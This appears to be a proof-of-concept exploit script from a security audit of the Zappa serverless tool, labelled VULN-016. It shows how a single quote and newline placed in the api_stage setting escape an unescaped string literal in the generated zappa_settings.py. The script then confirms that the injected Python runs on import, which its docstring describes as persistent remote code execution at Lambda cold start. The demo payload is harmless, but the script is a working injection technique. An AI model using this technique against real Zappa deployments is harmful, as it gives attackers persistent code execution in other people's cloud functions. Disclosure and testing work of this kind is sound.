#!/usr/bin/env python3
"""VULN-016 — Code injection into the generated zappa_settings.py via '{0!s}' interpolation.

Vulnerable code : targets/Zappa/zappa/cli.py:3050-3203 (get_zappa_settings_string; sinks e.g. :3129 API_STAGE)
Vulnerability   : CWE-94 Code Injection (unescaped interpolation into generated Python source).
Surface         : C -> deployed runtime (persistent cold-start RCE in the Lambda).

Mechanism (plain English)
-------------------------
Zappa generates the Lambda's `zappa_settings.py` by string-formatting config
scalars into Python source with `'{0!s}'` (no escaping / no repr()):

    settings_s += "API_STAGE='{0!s}'\n".format(self.api_stage)   # cli.py:3129
    settings_s += "PROJECT_NAME='{0!s}'\n".format(self.project_name)   # :3130
    ... (LOG_LEVEL, DOMAIN, BASE_PATH, REMOTE_ENV, DJANGO_SETTINGS, AUTHORIZER_FUNCTION, ...)

Any scalar that contains a single quote plus a newline breaks out of the string
literal and injects arbitrary module-level Python. That generated file is baked
into the Lambda zip and executed at every cold start (LambdaHandler imports it),
so the injected code runs in the function — persistently.

Exploitation idea
-----------------
A hostile/shared `zappa_settings.*` (Surface C threat model) sets e.g.
`api_stage = "dev'\n<python>\n#"`. The generated line becomes
`API_STAGE='dev'` <newline> `<python>` <newline> `#'`, executing `<python>`.

What a successful run proves
----------------------------
Driving the real `get_zappa_settings_string` with a malicious scalar yields a
generated settings string whose injected statement executes on import.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, lab_python, log, verdict

VULN = "VULN-016"

# Drive the real ZappaCLI.get_zappa_settings_string with a hostile api_stage scalar,
# then exec() the result (as a cold start would when importing zappa_settings.py).
_DRIVER = r"""
import json, secrets
import zappa.cli as cli
class T(cli.ZappaCLI):                       # stage_config is a read-only @property upstream
    @property
    def stage_config(self): return {}
tok = "INJECTED_" + secrets.token_hex(4)
# Break out of  API_STAGE='{0!s}'  and inject a module-level assignment.
malicious_api_stage = "dev'\n%s = __import__('os').getcwd()\n_REAL_API='x" % tok
z = T.__new__(T)
attrs = dict(app_function=None, app_type=None, use_websocket=None, exception_handler=None,
             debug=False, log_level="INFO", binary_support=False, context_header_mappings={},
             domain=None, base_path=None, remote_env=None, remote_env_bucket=None,
             remote_env_file=None, aws_region=None, environment_variables={},
             api_stage=malicious_api_stage, project_name="proj", settings_file=None,
             django_settings=None, s3_bucket_name="b", authorizer={})
for k, v in attrs.items():
    setattr(z, k, v)
settings_s = z.get_zappa_settings_string()   # <-- REAL target code generates the file contents
ns = {}
exec(settings_s, ns)                          # <-- simulates cold-start import of generated settings
print(json.dumps({
    "token": tok,
    "injected_ran": tok in ns,
    "injected_value": ns.get(tok),
    "snippet": [l for l in settings_s.splitlines() if tok in l or l.startswith("API_STAGE")][:3],
}))
"""


def main():
    banner(VULN, "'{0!s}' scalar interpolation -> code injection into generated settings",
           "zappa/cli.py:3050-3203 get_zappa_settings_string (sink e.g. :3129)")

    log("STEP", "generating zappa_settings.py from a hostile api_stage scalar, then importing it (exec)")
    cp = lab_python(_DRIVER)
    res = json.loads(cp.stdout.decode().strip().splitlines()[-1])
    for line in res["snippet"]:
        log("INFO", f"generated: {line}")
    log("INFO", f"after import, injected symbol {res['token']} = {res['injected_value']!r}")

    if res["injected_ran"] and res["injected_value"]:
        log("PROOF", f"the malicious api_stage escaped the '{{0!s}}' string literal; the generated "
                     f"zappa_settings.py contained an attacker statement that RAN on import "
                     f"(set {res['token']}={res['injected_value']!r}) — arbitrary Python executes at Lambda "
                     f"cold start, persistently.")
        log("OK", "exploit confirmed — code injection into generated settings -> cold-start RCE")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — hostile scalar injects executable Python into zappa_settings.py")
        return 0
    log("FAIL", f"injected_ran={res['injected_ran']}")
    verdict("FAILED", f"{VULN}: FAILED — injection did not execute")
    return 1


if __name__ == "__main__":
    sys.exit(main())
